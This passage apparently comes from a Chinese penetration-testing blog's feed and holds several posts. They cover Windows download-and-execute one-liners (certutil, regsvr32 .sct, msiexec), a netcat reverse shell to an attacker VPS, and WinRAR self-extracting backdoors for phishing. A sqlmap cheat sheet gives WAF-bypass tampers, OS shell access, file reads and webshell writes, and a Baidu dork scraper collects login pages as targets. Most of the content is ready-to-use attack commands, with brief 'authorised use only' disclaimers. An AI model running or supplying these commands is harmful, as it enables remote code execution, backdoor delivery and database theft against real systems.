bash">certutil -urlcache -<span class="hljs-built_in">split</span> -f http://xxx.com/artifact.exe 7z.exe &amp; start 7z.exe<br></code></pre></td></tr></table></figure><p>📌 certutil 可以在 <strong>普通用户权限</strong> 下运行，若使用管理员运行（如在 CS 中带红色闪电 ⚡），可获得更高权限。</p><p>✅ <strong>同样可以用 nc 反弹 shell：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certutil -urlcache -<span class="hljs-built_in">split</span> -f http://xxx.com/nc.exe nc.exe &amp; start nc.exe -t -e cmd.exe vps_ip 6667<br></code></pre></td></tr></table></figure><hr><h4 id="📌-4、regsvr32"><a href="#📌-4、regsvr32" class="headerlink" title="📌 4、regsvr32"></a>📌 4、regsvr32</h4><p>&#x9;<code>regsvr32</code> 是用于注册或卸载 COM 组件的命令 🧩。<br>可以通过构造 <code>.sct</code> 文件来下载并执行后门。</p><p>✅ <strong>示例：构造 .sct 文件执行命令</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">registration</span> <span class="hljs-attr">progid</span>=<span class="hljs-string">&quot;ShortJSRAT&quot;</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">&lt;![CDATA[</span></span><br><span class="language-xml"><span class="language-handlebars">ps = &quot;cmd.exe /c calc.exe&quot;;</span></span><br><span class="language-xml"><span class="language-handlebars">new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);</span></span><br><span class="language-xml"><span class="language-handlebars">]]&gt;</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">registration</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">scriptlet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">regsvr32.exe /u /n /s /i:http://xxx.com/calc.sct scrobj.dll<br></code></pre></td></tr></table></figure><hr><h4 id="📌-5、msiexec"><a href="#📌-5、msiexec" class="headerlink" title="📌 5、msiexec"></a>📌 5、msiexec</h4><p>&#x9;<code>msiexec</code> 可以远程执行 MSI 安装包 🎛️，可用于执行自定义 Payload。</p><p>✅ <strong>示例：使用 msf 生成 MSI</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 msfvenom 生成 MSI 文件，上传至 VPS</span><br>msfvenom -p windows/exec CMD=<span class="hljs-string">&#x27;calc.exe&#x27;</span> -f msi &gt; calc.msi<br></code></pre></td></tr></table></figure><p>📷 演示：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-1-1719815236749-7.png" alt="img"></p><p>✅ <strong>远程执行 MSI 文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msiexec /q /i http://xxx/calc.msi<br></code></pre></td></tr></table></figure><hr><h4 id="⚠️-6、总结"><a href="#⚠️-6、总结" class="headerlink" title="⚠️ 6、总结"></a>⚠️ 6、总结</h4><p>&#x9;以上几种姿势都是在合法授权下进行的红队演练和渗透测试中常用的后渗透技巧 🔒。</p>]]></content>
    
    
    
    <tags>
      
      <tag>命令执行</tag>
      
      <tag>权限维持</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>制作 WinRAR 后门小技巧</title>
    <link href="/2024/07/01/%E5%88%B6%E4%BD%9C%20winRAR%20%E5%90%8E%E9%97%A8/"/>
    <url>/2024/07/01/%E5%88%B6%E4%BD%9C%20winRAR%20%E5%90%8E%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h3><p>WinRAR 自带的自解压格式功能可以被巧妙利用，用来制作后门或者进行钓鱼攻击。本文分享利用 WinRAR 自解压功能制作简单后门的步骤和演示。</p><hr><h3 id="1、制作步骤"><a href="#1、制作步骤" class="headerlink" title="1、制作步骤"></a>1、制作步骤</h3><p>打开 WinRAR，新建一个压缩包，然后点击上方的【自解压格式】按钮，进入自解压设置界面。</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-2-1719815650307-5.png" alt="img"></p><hr><h3 id="2、配置自解压参数"><a href="#2、配置自解压参数" class="headerlink" title="2、配置自解压参数"></a>2、配置自解压参数</h3><p>通过自解压选项，可以指定压缩包解压时执行的程序或脚本，从而实现后门效果。</p><p>具体设置过程如下：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/winrar.gif" alt="img"></p><ul><li>你可以在“运行后执行的程序”中填写你想执行的后门程序或脚本。</li><li>配合 shift 后门使用或作为邮件附件进行钓鱼攻击，效果更佳。</li></ul><hr><h3 id="3、运行效果展示"><a href="#3、运行效果展示" class="headerlink" title="3、运行效果展示"></a>3、运行效果展示</h3><p>解压时，压缩包自动执行指定的后门程序：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/winrar1.gif" alt="img"></p><hr><h3 id="4、附加设置"><a href="#4、附加设置" class="headerlink" title="4、附加设置"></a>4、附加设置</h3><p>可以在自解压设置中配置“解压时替换或跳过已存在的文件”，提升后门的隐蔽性和成功率。</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-3-1719815642949-3.png" alt="img"></p><hr><p>💡 <strong>温馨提示</strong>：<br>此方法仅用于学习和安全研究，切勿用于非法用途。使用后门技术时请遵守法律法规和道德规范。</p><hr><p>这样就能利用 WinRAR 自解压功能，轻松制作简易后门或钓鱼包，适合安全测试和渗透演练场景。</p>]]></content>
    
    
    
    <tags>
      
      <tag>权限维持</tag>
      
      <tag>后门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap SQL注入工具的使用方法</title>
    <link href="/2024/07/01/sqlmap%20SQL%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2024/07/01/sqlmap%20SQL%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="1️⃣-常用命令"><a href="#1️⃣-常用命令" class="headerlink" title="1️⃣ 常用命令"></a>1️⃣ 常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py --random-agent --batch --level=2 --tamper=randomcase -u &lt;url&gt;<br></code></pre></td></tr></table></figure><hr><h2 id="2️⃣-进阶使用"><a href="#2️⃣-进阶使用" class="headerlink" title="2️⃣ 进阶使用"></a>2️⃣ 进阶使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 指定注入点参数</span><br>python sqlmap.py -r <span class="hljs-string">&quot;request.txt&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span><br><br><span class="hljs-comment"># 延时注入</span><br>python sqlmap.py -r r.txt --technique=T<br><br><span class="hljs-comment"># 自动爬行目标网站，同时使用表单注入</span><br>python sqlmap.py -u &lt;url&gt; --crawl=1<br>python sqlmap.py -u &lt;url&gt; --forms --crawl=2<br>python sqlmap.py -u &lt;url&gt; --forms --crawl=all<br><br><span class="hljs-comment"># POST注入</span><br>python sqlmap.py -u &lt;url&gt; --data=<span class="hljs-string">&quot;username=admin&amp;password=123456&quot;</span><br>python sqlmap.py -u &lt;url&gt; --data=<span class="hljs-string">&quot;username=admin&amp;password=123456&quot;</span> -p <span class="hljs-string">&quot;username&quot;</span><br>python sqlmap.py -u &lt;url&gt; --data=<span class="hljs-string">&quot;username=admin&amp;password=123456&quot;</span> --method=POST<br><br><span class="hljs-comment"># 使用代理</span><br>python sqlmap.py -u &lt;url&gt; --batch --level=5 --risk=3 --proxy=<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br><br><span class="hljs-comment"># 伪静态注入</span><br>python sqlmap.py -u <span class="hljs-string">&quot;http://example.com/news/1.html&quot;</span> --batch --level=5 --risk=3<br><br><span class="hljs-comment"># 指定数据库类型</span><br>python sqlmap.py -u &lt;url&gt; --dbms=mysql<br></code></pre></td></tr></table></figure><hr><h2 id="3️⃣-延时注入"><a href="#3️⃣-延时注入" class="headerlink" title="3️⃣ 延时注入"></a>3️⃣ 延时注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用时间延迟注入，每个注入请求后等待 5 秒</span><br>python sqlmap.py -u &lt;url&gt; --delay=5<br><br><span class="hljs-comment"># 时间延迟注入 + 布尔盲注</span><br>python sqlmap.py -u &lt;url&gt; --delay=5 --technique=T --time-sec=5<br></code></pre></td></tr></table></figure><hr><h2 id="4️⃣-绕过组合示例"><a href="#4️⃣-绕过组合示例" class="headerlink" title="4️⃣ 绕过组合示例"></a>4️⃣ 绕过组合示例</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 绕过空格</span><br>python sqlmap.py -u &lt;url&gt; --tamper=space2comment,space2plus<br><br><span class="hljs-comment"># 绕过引号</span><br>python sqlmap.py -u &lt;url&gt; --tamper=apostrophemask,apostrophenullencode,doublequotemask,doublequotenullencode<br><br><span class="hljs-comment"># 绕过关键字</span><br>python sqlmap.py -u &lt;url&gt; --tamper=randomcase,space2morehash<br></code></pre></td></tr></table></figure><hr><h2 id="5️⃣-常用参数"><a href="#5️⃣-常用参数" class="headerlink" title="5️⃣ 常用参数"></a>5️⃣ 常用参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 获取数据库、表、字段、数据</span><br>--dbs                  <span class="hljs-comment"># 获取所有数据库</span><br>-D <span class="hljs-string">&quot;blog&quot;</span> --tables     <span class="hljs-comment"># 获取指定数据库下所有表</span><br>-D <span class="hljs-string">&quot;blog&quot;</span> -T <span class="hljs-string">&quot;admin&quot;</span> --columns   <span class="hljs-comment"># 获取指定表的字段</span><br>-D <span class="hljs-string">&quot;blog&quot;</span> -T <span class="hljs-string">&quot;admin&quot;</span> -C <span class="hljs-string">&quot;username,password&quot;</span> --dump  <span class="hljs-comment"># 导出字段内容</span><br><br><span class="hljs-comment"># 当前信息</span><br>--current-db           <span class="hljs-comment"># 当前数据库</span><br>--current-user         <span class="hljs-comment"># 当前用户</span><br>--<span class="hljs-built_in">users</span>                <span class="hljs-comment"># 所有用户</span><br>--passwords            <span class="hljs-comment"># 所有用户密码</span><br>--is-dba               <span class="hljs-comment"># 是否为管理员</span><br><br><span class="hljs-comment"># 爆破辅助</span><br>--common-tables        <span class="hljs-comment"># 常见表名爆破</span><br>--common-columns       <span class="hljs-comment"># 常见字段爆破</span><br><br><span class="hljs-comment"># 其他</span><br>--threads 10           <span class="hljs-comment"># 多线程</span><br>--batch                <span class="hljs-comment"># 跳过交互提示</span><br>--random-agent         <span class="hljs-comment"># 随机 User-Agent</span><br>--flush-session        <span class="hljs-comment"># 清空 session 重新扫描</span><br>--fresh-queries        <span class="hljs-comment"># 忽略 session 缓存</span><br>--eta                  <span class="hljs-comment"># 显示预计完成时间</span><br><br><span class="hljs-comment"># 执行系统命令</span><br>--os-cmd=<span class="hljs-built_in">whoami</span><br>--os-shell<br><br><span class="hljs-comment"># 风险等级</span><br>--risk=0|1|2|3<br><span class="hljs-comment"># 检测深度</span><br>--level=1|2|3|4|5<br><br><span class="hljs-comment"># 指定注入技术</span><br>--technique=BEUSTQ<br></code></pre></td></tr></table></figure><hr><h2 id="6️⃣-高级功能"><a href="#6️⃣-高级功能" class="headerlink" title="6️⃣ 高级功能"></a>6️⃣ 高级功能</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 读取文件</span><br>--file-read=/etc/passwd<br><br><span class="hljs-comment"># 写入 WebShell</span><br>--file-write <span class="hljs-string">&quot;D:\\Tools\\Behinder\\shell.php&quot;</span> --file-dest <span class="hljs-string">&quot;G://www//shell.php&quot;</span><br><br><span class="hljs-comment"># 执行指定 SQL</span><br>--sql-query=<span class="hljs-string">&quot;&lt;SQL_query&gt;&quot;</span><br></code></pre></td></tr></table></figure><hr><h2 id="7️⃣-支持的数据库"><a href="#7️⃣-支持的数据库" class="headerlink" title="7️⃣ 支持的数据库"></a>7️⃣ 支持的数据库</h2><table><thead><tr><th>数据库</th><th>参数</th></tr></thead><tbody><tr><td>MySQL</td><td><code>--dbms=mysql</code></td></tr><tr><td>PostgreSQL</td><td><code>--dbms=postgresql</code></td></tr><tr><td>MSSQL</td><td><code>--dbms=mssql</code></td></tr><tr><td>Microsoft Access</td><td><code>--dbms=mdb</code></td></tr><tr><td>Oracle</td><td><code>--dbms=oracle</code></td></tr><tr><td>SQLite</td><td><code>--dbms=sqlite</code></td></tr><tr><td>Sybase</td><td><code>--dbms=sybase</code></td></tr><tr><td>Firebird</td><td><code>--dbms=firebird</code></td></tr><tr><td>Informix</td><td><code>--dbms=informix</code></td></tr><tr><td>MaxDB</td><td><code>--dbms=maxdb</code></td></tr><tr><td>DB2</td><td><code>--dbms=db2</code></td></tr><tr><td>HSQLDB</td><td><code>--dbms=hsqldb</code></td></tr><tr><td>MonetDB</td><td><code>--dbms=monetdb</code></td></tr><tr><td>Teradata</td><td><code>--dbms=teradata</code></td></tr><tr><td>MariaDB</td><td><code>--dbms=mariadb</code></td></tr></tbody></table><hr><h2 id="8️⃣-常用-tamper-脚本"><a href="#8️⃣-常用-tamper-脚本" class="headerlink" title="8️⃣ 常用 tamper 脚本"></a>8️⃣ 常用 <code>tamper</code> 脚本</h2><blockquote><p><code>tamper</code> 是 sqlmap 的强大绕过功能。</p></blockquote><table><thead><tr><th>脚本</th><th>用途</th></tr></thead><tbody><tr><td>randomcase.py</td><td>随机大小写</td></tr><tr><td>space2comment.py</td><td>空格替换为 <code>/**/</code></td></tr><tr><td>space2plus.py</td><td>空格替换为 <code>+</code></td></tr><tr><td>randomcomments.py</td><td>SQL 关键字注释分割</td></tr><tr><td>versionedkeywords.py</td><td>使用内联注释绕过</td></tr><tr><td>apostrophemask.py</td><td>引号 UTF-8 编码</td></tr><tr><td>base64encode.py</td><td>Base64 编码</td></tr><tr><td>space2morehash.py</td><td>空格替换为 <code>#</code> 并换行</td></tr><tr><td>apostrophenullencode.py</td><td>单引号用双字节 Unicode 替换</td></tr><tr><td>charencode.py</td><td>URL 编码</td></tr><tr><td>chardoubleencode.py</td><td>双重 URL 编码</td></tr><tr><td>modsecurityversioned.py</td><td>MySQL 内联注释绕过</td></tr><tr><td>unionalltounion.py</td><td><code>UNION ALL SELECT</code> 转 <code>UNION SELECT</code></td></tr><tr><td>bluecoat.py</td><td>用 <code>LIKE</code> 替代 <code>=</code></td></tr><tr><td>sp_password.py</td><td>拼接 <code>sp_password</code> 绕过</td></tr><tr><td>…</td><td>还有很多，可参考 sqlmap 自带文档</td></tr></tbody></table><hr><h2 id="📌-小结"><a href="#📌-小结" class="headerlink" title="📌 小结"></a>📌 小结</h2><ul><li>生产使用时建议先用低 <code>risk</code>、低 <code>level</code> 探测。</li><li>多配合 <code>tamper</code> 组合测试。</li><li>强烈建议配合 Burp Suite 抓包后使用 <code>-r</code> 参数。</li><li>遵守法律法规，仅用于授权渗透测试。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>sqlmap</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python编写的URL采集工具</title>
    <link href="/2024/07/01/%E4%BD%BF%E7%94%A8%20python%20%E7%BC%96%E5%86%99%E7%9A%84URL%E9%87%87%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
    <url>/2024/07/01/%E4%BD%BF%E7%94%A8%20python%20%E7%BC%96%E5%86%99%E7%9A%84URL%E9%87%87%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h4 id="0、简介-🔍"><a href="#0、简介-🔍" class="headerlink" title="0、简介 🔍"></a>0、简介 🔍</h4><p>一款专为百度设计的URL采集工具，支持高效采集网页链接，且可与 Burp + Xray 联动，实现自动化安全检测，提升渗透测试效率。🚀</p><h4 id="1、代码"><a href="#1、代码" class="headerlink" title="1、代码"></a>1、代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-comment">#限制线程的最大数量为100</span><br>sem=threading.Semaphore(<span class="hljs-number">100</span>)<br><span class="hljs-comment">#正则匹配url地址</span><br>url_re = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;&lt;a href=&quot;(.*?)&quot; target=&quot;_blank&quot;&#x27;</span>)<br>head = &#123;<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;max-age=0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;替换自己的cookie&#x27;</span>,<br>    <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;www.baidu.com&#x27;</span>,<br>    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;https://www.baidu.com/&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;document&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;navigate&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;same-origin&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="hljs-string">&#x27;?1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62&#x27;</span>,<br>    <span class="hljs-string">&#x27;sec-ch-ua&#x27;</span>: <span class="hljs-string">&#x27;&quot; Not;A Brand&quot;;v=&quot;99&quot;, &quot;Microsoft Edge&quot;;v=&quot;103&quot;, &quot;Chromium&quot;;v=&quot;103&quot;&#x27;</span>,<br>    <span class="hljs-string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="hljs-string">&#x27;?0&#x27;</span>,<br>    <span class="hljs-string">&#x27;sec-ch-ua-platform&#x27;</span>: <span class="hljs-string">&#x27;&quot;Windows&quot;&#x27;</span>,<br>&#125;<br><span class="hljs-comment">#代理地址，方便配合burp使用</span><br>proxies=&#123;<br>    <span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;127.0.0.1:8080&#x27;</span>,<span class="hljs-string">&#x27;https&#x27;</span>:<span class="hljs-string">&#x27;127.0.0.1:8080&#x27;</span><br>&#125;<br><span class="hljs-comment">#保存url地址</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">result_url</span>(<span class="hljs-params">target</span>):<br>    result = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;url.txt&#x27;</span>, <span class="hljs-string">&#x27;a+&#x27;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;url.txt&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">if</span> target <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> f.read():<br>            result.write(target +<span class="hljs-string">&#x27;\n&#x27;</span>)<br>            result.close()<br><span class="hljs-comment">#保存网站地址</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">result_domain</span>(<span class="hljs-params">target</span>):<br>    target = <span class="hljs-string">&#x27;http://&#x27;</span> + target.split(<span class="hljs-string">&#x27;/&#x27;</span>)[<span class="hljs-number">2</span>]<br>    result = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;domain.txt&#x27;</span>, <span class="hljs-string">&#x27;a+&#x27;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;domain.txt&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">if</span> target <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> f.read():<br>            result.write(target +<span class="hljs-string">&#x27;\n&#x27;</span>)<br>            result.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spider</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">with</span> sem:<br>        <span class="hljs-keyword">try</span>:<br>            req = requests.get(url=url,headers=head,timeout=<span class="hljs-number">5</span>)<br>            urls = url_re.findall(req.text)<br>            <span class="hljs-comment">#遍历获取到的url地址</span><br>            <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:<br>                <span class="hljs-comment">###百度采集到的url，二次请求后可以获取真实的网站地址 req.url</span><br>                req = requests.get(url=url,timeout=<span class="hljs-number">5</span>)<br>                target = req.url<br>                <span class="hljs-comment">#简单做一下过滤</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;baidu&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;51cto&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;csdn&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;jiameng&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target:<br>                    <span class="hljs-built_in">print</span>(target)<br>                    <span class="hljs-comment">#开启：联动burp   关闭：只采集url地址</span><br>                    <span class="hljs-comment">#req = requests.get(url=target,proxies=proxies,timeout=5)</span><br>                    result_url(target)<br>                    result_domain(target)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">0.1</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)!= <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;python url_spider.py &quot;inurl:login title:系统&quot;&#x27;</span>)<br>        sys.exit(-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        keyword = sys.argv[<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">750</span>,<span class="hljs-number">50</span>):<br>            url_start = <span class="hljs-string">&#x27;https://www.baidu.com/s?wd=&#x27;</span> + keyword + <span class="hljs-string">&#x27;&amp;rn=50&amp;pn=&#x27;</span><br>            url = url_start+<span class="hljs-built_in">str</span>(i)<br>            t=threading.Thread(target=spider,args=(url,))<br>            t.start()<br></code></pre></td></tr></table></figure><h4 id="2、截图"><a href="#2、截图" class="headerlink" title="2、截图"></a>2、截图</h4><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-2-1719814249993-1.png" alt="img"></p>]]></content>
    
    
    
    <tags>
      
      <tag>爬虫</tag>
      
      <tag>采集工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python编写的弱口令生成工具</title>
    <link href="/2024/07/01/%E4%BD%BF%E7%94%A8%20python%20%E7%BC%96%E5%86%99%E7%9A%84%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/"/>
